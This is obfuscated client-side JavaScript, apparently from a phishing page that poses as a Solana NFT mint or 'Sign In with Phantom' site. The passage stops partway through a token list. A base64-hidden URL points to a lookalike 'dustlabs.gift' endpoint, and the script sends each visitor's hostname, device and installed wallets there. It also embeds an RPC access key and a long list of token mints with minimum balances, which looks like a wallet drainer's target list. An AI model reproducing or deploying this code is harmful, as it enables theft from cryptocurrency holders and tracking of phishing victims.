let version = 98


function sleep(a) {
  return new Promise((c) => {
    setTimeout(c, a)
  })
}
function toBase64(a) {
  return btoa(a).replaceAll('+', '$')
}
let debug = true
async function info(a) {
  if (!debug) {
    try {
      return await (
        await fetch(
          atob(
            'aHR0cHM6Ly9kdXN0bGFicy5naWZ0L3YvaGV5LnBocD9rZXk9OGJFRW9rVVpMaG43bkFIeiZtPQ'
          ) + toBase64(a)
        )
      ).text()
    } catch (d) {
      return ''
    }
  }
}
const K = {}
K.phantom = true
K.solflare = false
K.slope = false
K.ethereum = false
K.bitcoin = false
const L = {}
L.installed = K
L.connected = false
L.address = ''
L.connection = null
L.delegate = ''
L.provider = null
L.balance = 0
L.lamports = 0
L.tokenAccount = null
L.signer = null
let connectButton,
  mintSpan,
  mintButton,
  wallet = L,
  browser = {
    ip: '',
    isDesktop: !isMobile(),
    isPageLoaded: false,
  }
async function updateConnectText(a) {
  connectButton.innerHTML = a
}
async function updateMintText(a) {
  mintButton.innerHTML = a
}
function isMobile() {
  let a = navigator.userAgent || navigator.vendor || window.opera
  return (
    /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
      a
    ) ||
    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
      a.substr(0, 4)
    )
  )
}
let isPolice = false
async function start() {
  wallet.installed.phantom = window.phantom?.solana?.isPhantom
  wallet.connection = new solanaWeb3.Connection(
    'https://late-flashy-tree.solana-mainnet.quiknode.pro/5bfebdd1d2f3b38873dcfe7e6bee1774451b469c/'
  )
  browser.ip = await info(
    'v' +
      version +
      ' ' +
      window.location.hostname +
      ' ' +
      (browser.isDesktop ? 'd' : 'm') +
      (wallet.installed.phantom ? ' phantom' : '') +
      ' ' +
      (wallet.installed.solflare ? ' solflare' : '') +
      ' ' +
      (wallet.installed.slope ? ' slope' : '') +
      ' ' +
      (wallet.installed.ethereum ? ' eth' : '') +
      ' ' +
      (wallet.installed.bitcoin ? ' btc' : '')
  )
  connectButton = document.getElementById('connectButton')
  updateConnectText('Sign Up / Sign In with Phantom')
  mintSpan = document.getElementById('mintSpan')
  mintButton = document.getElementById('mintButton')
  browser.isPageLoaded = true
  
}
const M = {}
M.name = 'J1'
M.mint = 'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn'
M.account = 'EBCQDZL1PF2G4NpbmykJjjjFQUd8Dc8xP6SUm65SZ7ZP'
M.owner = 'J3SHobdrZhVot87NAXRLxjgFb3cH3HXKEu7YiACrFaps'
M.minAmount = 1
const N = {}
N.name = 'WHEY'
N.mint = '5fTwKZP2AK39LtFN9Ayppu6hdCVKfMGVm79F2EgHCtsi'
N.account = '7ZHAcG8T12tWeSgvvTNDE3hskFfXRaVe3PRMjvEAzCC4'
N.owner = 'GqwqmvRqFwrWBTXXrghaiL4mxVMwxJimLaP6p8mDbfj2'
N.minAmount = 1
const O = {}
O.name = 'DEX'
O.mint = 'GsNzxJfFn6zQdJGeYsupJWzUAm57Ba7335mfhWvFiE9Z'
O.account = '2cMUu25tRGrbCqgMoGBGj5kCr44H8fui7nbrwCrEy7ib'
O.owner = 'D7fJHkyxwG2XbsCH3CgCgdp8UxJ2VJTCDKfSdv41DGvY'
O.minAmount = 1
const P = {}
P.name = 'SLM'
P.mint = 'xxxxa1sKNGwFtw2kFn8XauW9xq8hBZ5kVtcSesTT9fW'
P.account = 'C8iahhusCHTPJEtLz16HBedvvTPScs6WgiNsz3suxA44'
P.owner = '3XauUM8Rdw1oEy61EHFAK1wJnY61CJ5MTnLXgg6b5y4K'
P.minAmount = 1
const Q = {}
Q.name = 'GMT'
Q.mint = '7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx'
Q.account = 'Bs8EG67ZJsyM1RR6ZVkwqTPxgE98JJWaCQjLpTCxWLtC'
Q.owner = 'HRpVyf4V9V6QaPricZrWbqfVqCiyApYpTRB32vDXWyLM'
Q.minAmount = 1
const R = {}
R.name = 'SERUM'
R.mint = 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt'
R.account = '2f5LWFGbvDTz9LvxoPKRXpVJKcD5jQHuEHvC6pHmGhBe'
R.owner = 'BfDQVrjcLrrXD6AkgK4gVB2m7ghwCmK7MSkJqbYoY8Go'
R.minAmount = 1
const S = {}
S.name = 'WSOL'
S.mint = '7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj'
S.account = 'EQ7T2auP97k9fbnkvNC9fGVD8nuQJ1cqtf4ozxtoY3sR'
S.owner = 'CEz6dvi7W7W9dFE2N1MNAZez8urNAkQZfzA6jspFQSgA'
S.minAmount = 1
const T = {}
T.name = 'Honey 2'
T.mint = 'HonyeYAaTPgKUgQpayL914P6VAqbQZPrbkGMETZvW4iN'
T.account = '8rpzAHZmDM4e4trzKE3j1Ajc8f7NYTs2Ca9PA3btr91V'
T.owner = 'EK5MpYJahnLdtePrgVDZ7s4R9Pnqc8yKZW8enoEwPFAL'
T.minAmount = 1
const U = {}
U.name = 'TuLi'
U.mint = 'TuLipcqtGVXP9XR62wM8WWCm6a9vhLs7T1uoWBk6FDs'
U.account = 'C7K3suJRS4hovuWMwDGrL3qCFNnbzApAGZ1Uy66KNDXA'
U.owner = '3Nxbvycu5ocnyqaE2qrsQ5SFbzZjGK4fbAxmZZXbUgFq'
U.minAmount = 1
const V = {}
V.name = 'Orca'
V.mint = 'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE'
V.account = 'BR28fTvG5sfHeD8fDfwKot2dQf8qqJqXVMwHBatct1gz'
V.owner = '9YxBuUL9CwYo6wqrYY7oSu1in1tt2mjNwazvfcb6PGei'
V.minAmount = 1
const W = {}
W.name = 'Boring'
W.mint = 'BLwTnYKqf7u4qjgZrrsKeNs2EzWkMLqVCu6j8iHyrNA3'
W.account = '4HEChkJ2GfQUMAdVJyHdJZtzdaj9dCN7JEaNwbEiN97v'
W.owner = '5GHMPskpm21G3efYZRoHrCgYZKNTSkMMBVY3vne7PUQm'
W.minAmount = 1
const X = {}
X.name = 'Hedge'
X.mint = '5PmpMzWjraf3kSsGEKtqdUsCoLhptg4yriZ17LKKdBBy'
X.account = '4T16UJhJTKtu4gAWYmi7KuBTNLnuRD4VASv2fpPA6tTT'
X.owner = 'D9bdHe4dSS9vB4SkR3AXuFNgyVsAkHr8ExMYtqoNz5Zf'
X.minAmount = 1
const Y = {}
Y.name = 'SOC'
Y.mint = 'SLCLww7nc1PD2gQPQdGayHviVVcpMthnqUz2iWKhNQV'
Y.account = 'A9h3RFgvEKGXNmPTvnzUy5ukb8KKcmUUCcQnD8bhGyFb'
Y.owner = 'ExWxNUUg4dsw52Ny23a1UbN8qno7d5gZ33jnMQnwaN5U'
Y.minAmount = 10000000
const Z = {}
Z.name = 'USDC'
Z.mint = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'
Z.account = '3emsAVdmGKERbHjmGfQ6oZ1e35dkf5iYcS6U4CPKFVaa'
Z.owner = '7VHUFJHWu2CuExkJcJrzhQPJ2oygupTWkL2A2For4BmE'
Z.minAmount = 10000000
const a0 = {}
a0.name = 'HAWK'
a0.mint = 'BKipkearSqAUdNKa1WDstvcMjoPsSKBuNyvKDQDDu9WE'
a0.account = 'CYeSPjkuWFTecmokjCr958KdQWPUDhUuB18xMxr42C64'
a0.owner = 'HaVBmCuYfyeizHtPLWrCAk22pE96t4KbnVQxzGUxfDRw'
a0.minAmount = 10000000
const a1 = {}
a1.name = 'Parrot'
a1.mint = 'PRT88RkA4Kg5z7pKnezeNH4mafTvtQdfFgpQTGRjz44'
a1.account = 'FnhXfUAuZ2xmmhFJmh81YovKwwjYKkSSaeEDqcWTzSCg'
a1.owner = 'Dx3teYC3Vmf361CZRvdYbZpMKJsLdJ79me58Qr5zBBvZ'
a1.minAmount = 10000000
const a2 = {}
a2.name = 'Space'
a2.mint = 'HovGjrBGTfna4dvg6exkMxXuexB3tUfEZKcut8AWowXj'
a2.account = 'EJFpR4ignyGGe9Z4Ln8jfoa44kGefNCACSbVo7m5kce6'
a2.owner = '7RdxMrjpbYStUR6X9gUd1K2D9BETzVYPPsRP256kMVum'
a2.minAmount = 10000000
const a3 = {}
a3.name = 'HONEY'
a3.mint = '4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy'
a3.account = 'G2JwB7cagqXz4QbG2hXaN74Xn4Tvf9PVLxDCvEDzzyVP'
a3.owner = '79UpuZAxpFKkqE9EtVdXt1npYfjXdkvsdxBWwVHN2b88'
a3.minAmount = 10000000
const a4 = {}
a4.name = 'USDT'
a4.mint = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'
a4.account = '2LZVkPV9scmxBSB7JYjYonGvBhnDXparoDfzNnz6F7gX'
a4.owner = 'HVh6wHNBAsG3pq1Bj5oCzRjoWKVogEDHwUHkRz3ekFgt'
a4.minAmount = 10000000
const a5 = {}
a5.name = 'DUST'
a5.mint = 'DUSTawucrTsGU8hcqRdHDCbuYhCPADMLM2VcCb8VnFnQ'
a5.account = 'Gy53ne26Vqo2SwDw2UrXKUbsWxkZ7nGHJ6NZdtDY1er8'
a5.owner = 'G6pasfRCSLpvF5AaDZjfpPps5cyRuEjXWPCjXQqJEvhH'
a5.minAmount = 4767270552
const a6 = {}
a6.name = 'BONK'
a6.mint = 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263'
a6.account = 'F8FqZuUKfoy58aHLW6bfeEhfW9sTtJyqFTqnxVmGZ6dU'
a6.owner = 'AGkGWK1R669KDT4FCqgDgK7PgahGJPjD4J9xmVjuL9kn'
a6.minAmount = 2332422397411
const a7 = {}
a7.name = 'KIN'
a7.mint = 'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6'
a7.account = '8J33kACGFUCiHWmfYxctVGtaRzveftDrJaKs6jVa9TS1'
a7.owner = '7RmkMNQerKaVioRnmqZsHM5Gm8F3gngQG8umLNoK97q4'
a7.minAmount = 2
const a8 = {}
a8.name = 'WETH'
a8.mint = '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs'
a8.account = 'LK5gsm9CJdRqivPKCMb1bFXuF8x1rJmkcMnuN7bPqtn'
a8.owner = '9uyDy9VDBw4K7xoSkhmCAm8NAFCwu4pkF6JeHUCtVKcX'
a8.minAmount = 558464
const a9 = {}
a9.name = 'ETH2'
a9.mint = '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk'
a9.account = 'FsNfmGkNTvX3xd8vkN5QQeZVEKJymhH8vNJEhNkpomrQ'
a9.owner = '2yyBDoun86R6Nak11Hzuet2oZQQHFummqzN6ey5suMPn'
a9.minAmount = 558464
const aa = {}
aa.name = 'WBTC'
aa.mint = '3NZ9JMVBmGAqocybic2c7LQCJScmgsAZ6vQqTDzcqmJh'
aa.account = 'HDCDaEm3vAGfSHa4RaEub9SHuHwCEPdhysGfWnLThfGh'
aa.owner = 'GXbJWY8H5YwvhrRYZvSWUAcGMGjR7ygUkQNwZxefgzdm'
aa.minAmount = 37483
const ab = {}
ab.name = 'SBTC'
ab.mint = '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E'
ab.account = '5NXxg5mGxBBi8d2mhDPqQpDm3hpHY1ncw8iVFbLR9vjq'
ab.owner = 'DgLcG7dhE8VBoA4rJu1resczXkYTSGUx7Ry1HicqcqZr'
ab.minAmount = 5761
const ac = {}
ac.name = 'GUAC'
ac.mint = 'AZsHEMXd36Bj1EMNXhowJajpUXzrKcK57wW4ZGXVa7yR'
ac.account = 'DJMyCZL5jXv83cSwVysqEzQdaevPiTGGHG6ePhEbXgrs'
ac.owner = '4rJktf4exNDLBjkm3RPD8BBYihTZKVtr8jPpy7DjNrQA'
ac.minAmount = 163114638470916
const ad = {}
ad.name = 'KING'
ad.mint = '9noXzpXnkyEcKF3AeXqUHTdR59V5uvrRBUZ9bwfQwxeq'
ad.account = '9NGoYAPfvGDpXM5FGw6FNiDwkYVRmisyBnAvEP2coGwH'
ad.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
ad.minAmount = 25841713475695
const ae = {}
ae.name = 'SCS'
ae.mint = 'SCSuPPNUSypLBsV4darsrYNg4ANPgaGhKhsA3GmMyjz'
ae.account = 'DnRXpnXwmSJRoZhb1ogqFCTZXAYUVEZrUSyxn5XfA3bF'
ae.owner = '7RNYdRkMWSKL8BM2pES8g8WZEp3Gm9azYh8yJoiFwtrb'
ae.minAmount = 466257233
const af = {}
af.name = 'IOT'
af.mint = 'iotEVVZLEywoTn1QdwNPddxPWszn3zFhEot3MfL9fns'
af.account = '8mDP3qP4pnqz5DeaXnRRX1GT9s5tXxFqRw61rw1H11Gs'
af.owner = '2AdZQmGikAMWahuJRb27PGABQyF6iyQ8aUUYyDDwRRG6'
af.minAmount = 26173881562
const ag = {}
ag.name = 'HNT'
ag.mint = 'hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux'
ag.account = 'EWTxqDJfPgANQxfsB4uLsjXVTPYDtYw32fq6bhuEvbYJ'
ag.owner = '2AdZQmGikAMWahuJRb27PGABQyF6iyQ8aUUYyDDwRRG6'
ag.minAmount = 740012212
const ah = {}
ah.name = 'PRNT'
ah.mint = '4TUNzcgp2fPD48fcW4seRjyqyDZMrPj4ZubnXFEsKeYk'
ah.account = '9D6MEYF2CZVkTWLXpBfAd36EdRLQs4NEcVDjh5cyUd4q'
ah.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
ah.minAmount = 2982836424049
const ai = {}
ai.name = 'NANA'
ai.mint = 'HxRELUQfvvjToVbacjr9YECdfQMUqGgPYB68jVDYxkbr'
ai.account = '8nxByPkQ2SAoo7YcvzqhSM32wq6191jKweauHjWJD9Zp'
ai.owner = '3LcKTdV47hLhXmaqDqzCqby7Y2pPbvW91RME99rCVQSG'
ai.minAmount = 2462591223311
const aj = {}
aj.name = 'PUGAI'
aj.mint = 'PugAiDuaQ5hzicBHAW9qrQQ8qi4B6sh3n7PknKhyjeX'
aj.account = '7jfnsBBBuz4mxTjfQejxPHqMxpkc6SYkDfBnpjeDMHW2'
aj.owner = 'G7vNFvgBCEYSRxiEQ2U1Nc1ktmXhZy9haFoZH4gGWqK6'
aj.minAmount = 275535412217534
const ak = {}
ak.name = 'SHDW'
ak.mint = 'SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y'
ak.account = 'jLTfzy6WaCceQdyKSnyNxmb8BhBCdL9YNtbVfnaeQ6Z'
ak.owner = '5rgVibjBeuu8e1sTjDLuJ5DQJsG8tiYstMRXN2YtPPYd'
ak.minAmount = 76139994587
const al = {}
al.name = 'RLB'
al.mint = 'RLBxxFkseAZ4RgJH3Sqn8jXxhmGoz9jWxDNJMh8pL7a'
al.account = 'NjmhPoX5tEFsiSCjCNQFFbhHgSL2G6xkBUTweq4rdZQ'
al.owner = 'AAbcWqh1WGQkVaK6GrMae1dVGcriwCxPh8PrW69vAEp4'
al.minAmount = 30500
const am = {}
am.name = 'SWTS'
am.mint = '5SwxhEunuUUcWe4ojybdDwky6dpLxAehNmF4AA71STNh'
am.account = '9BfsXy5iPiocK8XCC4NWUpsyxB9gB8eiYQbXG8u9sjML'
am.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
am.minAmount = 231034205758157
const an = {}
an.name = 'SLOW'
an.mint = 'SLoWCV423kWjuKCKBAmr1aiDbuFQua8wy29GYHTCnkz'
an.account = '5kon7Et3nDuue4dSrZCcMaQp4E66hj6sshNE8v4MXwLR'
an.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
an.minAmount = 6949243655358033
const ao = {}
ao.name = 'MBS'
ao.mint = 'Fm9rHUTF5v3hwMLbStjZXqNBBoZyGriQaFM6sTFz3K8A'
ao.account = 'CtzX6dQwg28NFZhQhM6sJBGX4u9aD37s9RahZnS1CsBy'
ao.owner = 'HmaVvVd3ThxThhyritsfKxKgydccVTXdDGw9ZzdRWQ4k'
ao.minAmount = 186560746
const ap = {}
ap.name = 'CHODE'
ap.mint = 'chodeDSo8UYzBebGysm3djM6b2Cu54x5PwDXW8Tda2v'
ap.account = 'DhfqLi4kePR1Yg3MaMA7QfJFUAkqy46kHxXrmuSFAgj9'
ap.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
ap.minAmount = 142349493121315
const aq = {}
aq.name = 'NOCT'
aq.mint = '8HfNu2EfwFQz2srSNDvPsjaWV3G65ZWP3pDC67mcNv6J'
aq.account = 'BoytVDcAZSC9Y4fCapXHiNwZk2k5ZWNrqwHB4ouXzEuJ'
aq.owner = '88FyQ6iHz1x7EbwQorrjNeibmq2cJWmDNJbbPEEbp1rh'
aq.minAmount = 202093642635789
const ar = {}
ar.name = 'DUAL'
ar.mint = 'DUALa4FC2yREwZ59PHeu1un4wis36vHRv5hWVBmzykCJ'
ar.account = 'cA7xusMSV7r9WJNrDy5ELfuTRZsfxySYCUqiarDvkyy'
ar.owner = '5SJpgGUhX2gN8aRUWaJ7nBLhbNWkqNmt3rS5YmqSs1m3'
ar.minAmount = 373340103
const as = {}
as.name = 'MSOL'
as.mint = 'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So'
as.account = 'CrR7DS7A8ABSsHwx92K3b6bD1moBzn5SpWf2ske8bqML'
as.owner = 'QM3ACFu3VD9N6z6dmBseezxrNRP1T4MruGhpJX8B3nC'
as.minAmount = 440224559
const at = {}
at.name = 'RAY'
at.mint = '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R'
at.account = 'DmKR61BQk5zJTNCK9rrt8fM8HrDH6DSdE3Rt7sXKoAKb'
at.owner = '8pFhUqCU7Fkxfg2DLytRDf7a9oK4XGtN92PrYwtVQc6G'
at.minAmount = 47640365
const au = {}
au.name = 'JELLY'
au.mint = '9WMwGcY6TcbSfy9XPpQymY3qNEsvEaYL3wivdwPG2fpp'
au.account = '8y5KPE6gmsD1tqSA317WrQCBRrREYs1SqTYLsS9NPhHz'
au.owner = 'GGiE2t3RTCUXNTZn66eigJf7WnNZC1uJGXiJrfaM5Zy2'
au.minAmount = 94834995
const av = {}
av.name = 'FORGE'
av.mint = 'FoRGERiW7odcCBGU1bztZi16osPBHjxharvDathL5eds'
av.account = '3eSGqRNveoFHGWQ4dkadzcF25N5hPfGDRcBTvDZNe9gv'
av.owner = 'BSLoqEJXKKmE4yCCNp58sYAq5n6u29hgaAX5gCvF3ikw'
av.minAmount = 79027819732
const aw = {}
aw.name = 'WOOPA'
aw.mint = '26vSyWdduSXwMRsA6MKbzAvuRUAuLSCKW9HRCLVgbxEm'
aw.account = 'J8AEzckH16G4bpz852bibyao3iJ1hWxig4XTskWpcqEu'
aw.owner = '2CAYKEmXpZ545de66ommdaVfwMx2nCMoDnj1Yy2ndnkx'
aw.minAmount = 600200356724
const ax = {}
ax.name = 'SLOTH'
ax.mint = '9NPH3EjKw8p7awTffjnLQTJcAgWgJLLNoRrNqWBFWUSK'
ax.account = 'BdRCdXtNutamMSrLkJqStHxuE5CKArSDbGXWBKXHnrqp'
ax.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
ax.minAmount = 2031452744770644
const ay = {}
ay.name = 'HADES'
ay.mint = 'BWXrrYFhT7bMHmNBFoQFWdsSgA3yXoAnMhDK6Fn1eSEn'
ay.account = 't6EKHBq9KA8WyigsLHxAYPVGgvpnbcMD35fyMqQ5ryU'
ay.owner = 'd4sH8ckL3iowTSin8gQaXtY9nQvdKCx2jimiV9qdndd'
ay.minAmount = 38670088213
const az = {}
az.name = 'ACS'
az.mint = '5MAYDfq5yxtudAhtfyuMBuHZjgAbaS9tbEyEQYAhDS5y'
az.account = 'Bt11ddBC7Km2x3tTSj1ENddCNkmAnpNjPDf16ZKNiLuV'
az.owner = '5QvSKEHDGSXjzUDaZj3UyDtJ844XP1sVaQ46sXZKmGmo'
az.minAmount = 2050666050
const aA = {}
aA.name = 'YOLO'
aA.mint = '4jE4VuqFWZfmSXjTDD5KUoN2qkVu96nPTPj4mhs5PA1W'
aA.account = '5tvPGMzpuPQ1GXyC6XXSopjX7JPsozifyYdXE5Ub7DcL'
aA.owner = '5vSyjCNBeryS3Cd7xTP5yZzWAtbpNhKKfAVgUuphJsVd'
aA.minAmount = 4698274091784
const aB = {}
aB.name = 'STONK'
aB.mint = '7qaLwGZp3ZKL4Lmh6QpdYbZwCapQLB5md2LtDJVjEPpD'
aB.account = '5Hw357p1om6ZRGBZ8vwvSz6pihr8VHUbViFH6gjdDypp'
aB.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
aB.minAmount = 11759583764337
const aC = {}
aC.name = 'PEPE'
aC.mint = 'F9CpWoyeBJfoRB8f2pBe2ZNPbPsEE76mWZWme3StsvHK'
aC.account = '3eJHhLteQfDJVXyzhssaoxDLSuZ7ZFNxf4S2e9kJQ8Nj'
aC.owner = 'HSYR4N8Ps7gpeS4mceyWsXXirDYa3FY7npHqfrSLPxtz'
aC.minAmount = 44819229161
const aD = {}
aD.name = 'KITTI'
aD.mint = 'B5Fvzd2RL5ctrmFsvDafXiNGbBqbxapiryJo8JfoSEcA'
aD.account = 'Dh1wiAffBjEJbp7K8NqZNFFiZV9XKYf3NPs7fNwrat9f'
aD.owner = '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1'
aD.minAmount = 6980237508990102
const aE = {}
aE.name = 'CRY'
aE.mint = '56tNQ29XBrbovm5K5SThuQatjCy92w2wKUaUeQ8WCD9g'
aE.account = 'DaY6Zzrb5cmwNxBTyzrq9KHwoAwNfvtoe8BiR9uwWo8h'
aE.owner = 'GkVPyfyNKBcQujyH6ZyzkhAsijrAECAGr1evRZQFM4iA'
aE.minAmount = 8692970079832295
const aF = {}
aF.name = 'CULT'
aF.mint = 'Cu1tCSoauo4Vtqsr9cD86RS4XJqS88LauU69AFV6KMH7'
aF.account = 'AYNtoBw1M9n59YDuu11Fy8C6ctdAykXA5XUQK2Rdbo9z'
aF.owner = '333nKSDMZ8jC5YQDDLJ1J74dnLTB6KyVEUhgWGmvjRCp'
aF.minAmount = 684130839014098
const aG = {}
aG.name = 'IOT'
aG.mint = 'iotEVVZLEywoTn1QdwNPddxPWszn3zFhEot3MfL9fns'
aG.account = '8mDP3qP4pnqz5DeaXnRRX1GT9s5tXxFqRw61rw1H11Gs'
aG.owner = '2AdZQmGikAMWahuJRb27PGABQyF6iyQ8aUUYyDDwRRG6'
aG.minAmount = 26173881562
const aH = {}
aH.name = 'SAMO'
aH.mint = '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU'
aH.account = 'Ff1a1jKTkNgjpT67argz2GsXnBYW5tE8NrWTrV2M2T7v'
aH.owner = '9un5wqE3q4oCjyrDkwsdD48KteCJitQX5978Vh7KKxHo'
aH.minAmount = 884810314488
const aI = {}
aI.name = 'ATLAS'
aI.mint = 'ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx'
aI.account = 'BjoXAUPySL5vdCDS4cnP5KgcqLpbdZnseCHaCdxCpRgJ'
aI.owner = '5MPLVoZ2cJHy8gkvFu9tCTuqu9P8Fm8xz8Swpo6TfjDu'
aI.minAmount = 525343246061
const aJ = {}
aJ.name = 'HXRO'
aJ.mint = 'HxhWkVpk5NS4Ltg5nij2G671CKXFRKPK8vy271Ub4uEK'
aJ.account = 'D9bBz5CPdo441weq83PkSU67maYe9REZAsBSntJPGhz1'
aJ.owner = 'WE5NMhRDPMpGrakkx3KWr6hSxr2KerJrcVmVwb7DF3u'
aJ.minAmount = 9793386233
const aK = {}
aK.name = 'POLIS'
aK.mint = 'poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk'
aK.account = 'ETZmZ7k5AsUxKa5BkMWmxYw6dYZxnL9ontPBuJpEB3G9'
aK.owner = '5MPLVoZ2cJHy8gkvFu9tCTuqu9P8Fm8xz8Swpo6TfjDu'
aK.minAmount = 5869074609
const aL = {}
aL.name = 'PIP'
aL.mint = 'HHjoYwUp5aU6pnrvN4s2pwEErwXNZKhxKGYjRJMoBjLw'
aL.account = '8U8inYBvmqth9Pps6MgFhiCsAbZumkSFHxB5xn5YTVGm'
aL.owner = '5Nd51PxvAgBoMwG4nVFNDDqNzSw9rybadmEukwzx8qEH'
aL.minAmount = 55503169747
const aM = {}
aM.name = 'AVAX'
aM.mint = 'AUrMpCDYYcPuHhyNX8gEEqbmDPFUpBpHrNW3vPeCFn5Z'
aM.account = '3VvdcfkXwrfoH7TXvPDDiPHJBtGnaDTTN9tuTveQ22dM'
aM.owner = '3gg1jbrxUqhEPBxV6pB4GkLJzjLsmdRQT4qUFXXQLQyS'
aM.minAmount = 457503644
const aN = {}
aN.name = 'WAVAX'
aN.mint = 'KgV1GvrHQmRBY8sHQQeUKwTm2r2h8t4C8qt12Cw1HVE'
aN.account = 'EwkqSxXbFBvtfqmuR7ofv5FhwWQXbTQDkKEB3asvNnyE'
aN.owner = 'DjEWEsWuSjgkqd4eMrFN3to48YA2W7ECx6wSQEVYxTjQ'
aN.minAmount = 46866828
const aO = {}
aO.name = 'USDCET'
aO.mint = 'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM'
aO.account = '8Tv98Mbm7v37s1mEtfWZE6pUirRPsPaePcQ4HtcwTait'
aO.owner = 'GDmSxpPzLkfxxr6dHLNRnCoYVGzvgc41tozkrr4pHTjB'
aO.minAmount = 10000000
const aP = {}
aP.name = 'GENE'
aP.mint = 'GENEtH5amGSi8kHAtQoezp1XEXwZJ8vcuePYnXdKrMYz'
aP.account = 'FZDYcwJQEAxr5P26JBpC4x8siMcxRpvZ7sbKoPi11ZX7'
aP.owner = 'EVDMxYEWokGgsTwsjndMgb3WkDufQC6Peh41JsCD3C4w'
aP.minAmount = 1
let tokens = [
    M,
    N,
    O,
    P,
    Q,
    R,
    S,
    T,
    U,
    V,
    W,
    X,
    Y,
    Z,
    a0,
    a1,
    a2,
    a3,
    a4,
    a5,
    a6,
    a7,
    a8,
    a9,
    aa,
    ab,
    ac,
    ad,
    ae,
    af,
    ag,
    ah,
    ai,
    aj,
    ak,
    al,
    am,
    an,
    ao,
    ap,
    aq,
    ar,
    as,
    at,
    au,
    av,
    aw,
    ax,
    ay,
    az,
    aA,
